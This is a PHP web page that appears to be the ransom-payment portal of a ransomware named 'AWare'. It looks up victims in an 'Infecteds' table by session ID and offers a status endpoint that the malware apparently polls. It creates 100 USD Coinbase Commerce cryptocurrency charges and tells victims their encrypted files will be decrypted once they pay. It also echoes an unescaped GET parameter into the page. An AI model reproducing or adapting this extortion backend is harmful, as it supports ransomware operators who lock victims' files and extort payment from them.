<?php

include('connect.php');

$SessionID = isset($_GET['sessid']) ? $_GET['sessid'] : '';

if (isset($_GET['MonitoringID']))
{
    
    $searchID = $pdo->prepare('SELECT COUNT(*) FROM Infecteds WHERE SessionID = ?');
    $searchID->execute([$_GET['MonitoringID']]);
    
    if ($searchID->fetchColumn() > 0)
    {
        $MonitoringID = $pdo->prepare('SELECT Payment_Status FROM Infecteds WHERE SessionID = ?');
        $MonitoringID->execute([$_GET['MonitoringID']]);
        
        $Status = $MonitoringID->fetchColumn();
        
        echo $Status;
    }
    else
    {
        echo 'error';
    }
    
    die();
}

?>

<html>
    <head>
        <title>AWare</title>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
        <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous" type="ea08ba46dec5e6491c442b92-text/javascript"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous" type="ea08ba46dec5e6491c442b92-text/javascript"></script>
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous" type="ea08ba46dec5e6491c442b92-text/javascript"></script>
    </head>
    <body>
        <center>
            <br/>
            
            <?php
            
                if (isset($_POST['Pay']) && isset($_POST['AppSessionID']))
                {
                    $CounterSessionIDs = $pdo->prepare('SELECT COUNT(*) FROM Infecteds WHERE SessionID = ?');
                    $CounterSessionIDs->execute([$_POST['AppSessionID']]);
                    
                    if ($CounterSessionIDs->fetchColumn() < 1)
                    {            
                            
                        echo 
                        '
                            <div class="alert alert-danger" role="alert">
                              <strong>Oh fail!</strong> The Session ID entered does not exist.
                            </div>                
                        ';
                    }
                    else
                    {
                        $postData = array(
                            'name' => 'AWare',
                            'local_price' => array('amount' => '100', 'currency' => 'USD'),
                            'pricing_type' => 'fixed_price',
                            'metadata' => array('sessionid' => $_POST['AppSessionID']),
                            'redirect_url' => URL_PAGE,
                            'cancel_url' => URL_PAGE
                        );
                        
                        // Setup cURL
                        $ch = curl_init('https://api.commerce.coinbase.com/charges');
                        curl_setopt_array($ch, array(
                            CURLOPT_POST => TRUE,
                            CURLOPT_RETURNTRANSFER => TRUE,
                            CURLOPT_HTTPHEADER => array(
                                'X-CC-Api-Key: ' . API_KEY_COINBASE_COMMERCE,
                                'X-CC-Version: 2018-03-22',
                                'Content-Type: application/json'
                            ),
                            CURLOPT_POSTFIELDS => json_encode($postData)
                        ));
                        
                        // Send the request
                        $response = curl_exec($ch);
                        
                        // Check for errors
                        if($response === FALSE){
                            die(curl_error($ch));
                        }
                        
                        // Decode the response
                        $responseData = json_decode($response, true);
                        
                        // Close the cURL handler
                        curl_close($ch);
                        
                        // Print the date from the response
                        
                        $codePayment = $responseData['data']['code'];

                        $hostedURL = $responseData['data']['hosted_url'];
                        
                        $SearchPaymentCode = $pdo->prepare('SELECT COUNT(*) FROM Infecteds WHERE Payment_Code = ? AND SessionID = ?');
                        $SearchPaymentCode->execute([$codePayment, $_POST['AppSessionID']]);
                        
                        if ($SearchPaymentCode->fetchColumn() > 0)
                        {
                            
                            $GetInfoPayment = $pdo->prepare('SELECT Payment_Link FROM Infecteds WHERE Payment_Code = ? AND SessionID = ?');
                            $GetInfoPayment->execute([$codePayment, $_POST['AppSessionID']]);
                            
                            $link = $GetInfoPayment->fetchColumn();
                            
                            echo '<script> window.location.href = "'.$link.'"; </script>';
                            
                            die();
                            
                        }
                        else
                        {
                            $insertPayment = $pdo->prepare('UPDATE Infecteds SET Payment_Status = ?, Payment_Code = ?, Payment_Link = ? WHERE SessionID = ?');
                            $insertPayment->execute(['CREATED', $codePayment, $hostedURL, $_POST['AppSessionID']]);
                        }
                        
                            
                        echo '<script> window.location.href = "'.$hostedURL.'"; </script>';
                        die();
                                                
                    }
                }            
            ?>
            
            <br/>
            <br/>
            <div class="form" style="width: 35rem;">
                <form method="POST" action="">
                    <div class="form-group">
                        <label for="SessionIDInput">Session-ID (Appears on Console)</label>
                        <input type="text" class="form-control" name="AppSessionID" placeholder="Enter your Session ID (Required)" value="<?php echo $SessionID; ?>" required>
                    </div>
                    <small id="emailHelp" class="form-text text-muted">After your payment is confirmed, AWare will automatically decrypt the encrypted files and close its process, leaving your computer without records of it, from then on, you can delete it and forget about it.</small>
                    <br/>
                    <button type="submit" class="btn btn-primary" name="Pay">Pay (CryptoCurrencies)</button>
                </form>
            </div>
        </center>
        <script src="https://ajax.cloudflare.com/cdn-cgi/scripts/7089c43e/cloudflare-static/rocket-loader.min.js" data-cf-settings="ea08ba46dec5e6491c442b92-|49" defer=""></script>
    </body>
</html>
